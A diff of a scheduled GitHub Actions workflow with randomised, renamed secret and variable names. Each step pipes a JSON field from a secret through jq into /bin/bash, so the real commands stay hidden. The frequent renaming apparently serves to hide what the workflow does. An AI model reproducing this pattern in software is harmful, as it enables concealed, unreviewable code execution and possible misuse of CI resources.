@@ -1,33 +1,33 @@
 name: dongguange7412
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 1/6 * * *'
+    - cron: '47 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongguange7412
         env:
-          adzm05702: ${{ secrets.adzm05702 }}
+          iqibv9: ${{ secrets.iqibv9 }}
         run: |
-          echo $adzm05702 | jq -r .sbnnw25 | /bin/bash
-          echo $rtfm64154 | jq -r .sfm7732 | /bin/bash
-          echo $zup1 | jq -r .tuan8146 | /bin/bash
-          echo $hjqow9 | jq -r .irn19 | /bin/bash
-          echo $qfgh74008 | jq -r .g5432 | /bin/bash
-          echo $oujlv68055 | jq -r .ga88677 | /bin/bash
-          echo $p9 | jq -r .kywu369 | /bin/bash
-          echo $nxl2089 | jq -r .hjc18675 | /bin/bash
-          echo $kc4 | jq -r .xqxv9 | /bin/bash
-          echo $sb90 | jq -r .mbpee821 | /bin/bash
-          echo $mabz9491 | jq -r .l87140 | /bin/bash
-          echo $hrpn7 | jq -r .fmhwo51 | /bin/bash
-          echo $wuii6561 | jq -r .psbr0 | /bin/bash
-          echo $rfivc68365 | jq -r .bj28 | /bin/bash
-          echo $zx29 | jq -r .fr470 | /bin/bash
-          echo $kg931 | jq -r .odd76645 | /bin/bash
-          echo $q65972 | jq -r .zh34615 | /bin/bash
-          echo $sukpz7 | jq -r .oj95 | /bin/bash
+          echo $iqibv9 | jq -r .u893 | /bin/bash
+          echo $mh09303 | jq -r .uz1 | /bin/bash
+          echo $tu56498 | jq -r .nhssj1533 | /bin/bash
+          echo $aot3 | jq -r .okb973 | /bin/bash
+          echo $gifa8 | jq -r .xkywg63467 | /bin/bash
+          echo $al8028 | jq -r .vunt62784 | /bin/bash
+          echo $ie6580 | jq -r .c96 | /bin/bash
+          echo $l367 | jq -r .wzkpk19 | /bin/bash
+          echo $z27 | jq -r .ks71 | /bin/bash
+          echo $wyntm961 | jq -r .xly40069 | /bin/bash
+          echo $e3 | jq -r .i24 | /bin/bash
+          echo $uy8 | jq -r .gms5875 | /bin/bash
+          echo $ez74495 | jq -r .dxrif4206 | /bin/bash
+          echo $kqar30 | jq -r .qgh7310 | /bin/bash
+          echo $zj1350 | jq -r .bhsjt0 | /bin/bash
 
